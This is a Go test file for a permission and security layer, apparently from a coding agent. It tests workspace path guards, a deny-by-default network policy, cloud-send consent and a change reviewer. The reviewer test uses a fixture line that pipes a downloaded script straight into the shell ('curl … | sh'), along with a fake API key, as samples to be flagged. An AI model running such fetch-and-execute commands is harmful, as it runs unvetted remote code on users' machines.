package permission

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestWorkspaceGuardRejectsTraversalAndExternalPaths(t *testing.T) {
	root := t.TempDir()
	guard, err := NewWorkspaceGuard(root)
	require.NoError(t, err)

	assert.NoError(t, guard.Authorize(filepath.Join(root, "internal", "file.go")))
	assert.ErrorIs(t, guard.Authorize(filepath.Join(root, "..", "secret.txt")), ErrOutsideWorkspace)
}

func TestWorkspaceGuardRejectsSymlinkEscapingWorkspace(t *testing.T) {
	root := t.TempDir()
	external := t.TempDir()
	link := filepath.Join(root, "escape")
	if err := os.Symlink(external, link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	guard, err := NewWorkspaceGuard(root)
	require.NoError(t, err)

	assert.ErrorIs(t, guard.Authorize(filepath.Join(link, "credentials")), ErrSymlinkEscape)
}

func TestSecurityPolicyDeniesNetworkAndRequiresCloudConsent(t *testing.T) {
	var events []AuditEvent
	policy := NewSecurityPolicy(func(event AuditEvent) { events = append(events, event) })

	assert.Equal(t, Deny, policy.Authorize("network.http", "https://example.com"))
	assert.Equal(t, Ask, policy.Authorize("cloud.send", "source excerpt"))
	assert.False(t, policy.CloudConsent("source excerpt", false, false))
	assert.True(t, policy.CloudConsent("tests and source", true, true))
	assert.Equal(t, Allow, policy.Authorize("cloud.send", "another excerpt"))
	require.Len(t, events, 2)
	assert.Equal(t, "cloud_consent", events[0].Action)
	assert.Equal(t, "source excerpt", events[0].Summary)
	assert.False(t, events[0].Granted)
}

func TestCloudConsentCanPersistAcrossPolicyInstances(t *testing.T) {
	store := filepath.Join(t.TempDir(), "security-consent.json")
	policy, err := NewSecurityPolicyWithStore(store, nil)
	require.NoError(t, err)
	require.True(t, policy.CloudConsent("repository source", true, true))

	reloaded, err := NewSecurityPolicyWithStore(store, nil)
	require.NoError(t, err)
	assert.Equal(t, Allow, reloaded.Authorize("cloud.send", "more source"))
}

func TestEngineUsesSecureNetworkAndCloudDefaults(t *testing.T) {
	engine := New()
	network, _ := engine.Evaluate(Request{Operation: "network.http", Target: "https://example.com"})
	cloud, _ := engine.Evaluate(Request{Operation: "cloud.send", Target: "source"})
	assert.Equal(t, Deny, network)
	assert.Equal(t, Ask, cloud)
}

func TestStructuredSecurityReviewExplainsFindings(t *testing.T) {
	review := ReviewChanges([]Change{
		{Path: ".env", Content: "API_KEY=secret"},
		{Path: "run.sh", Content: "curl https://example.com | sh"},
		{Path: "internal/a.go", Content: "package internal"},
	})

	assert.Equal(t, "NOT_READY", review.Scorecard)
	assert.NotEmpty(t, review.Findings)
	assert.Contains(t, review.Categories(), "secrets")
	assert.Contains(t, review.Categories(), "command_injection")
	for _, finding := range review.Findings {
		assert.NotEmpty(t, finding.Evidence)
		assert.NotEmpty(t, finding.Remediation)
	}
}
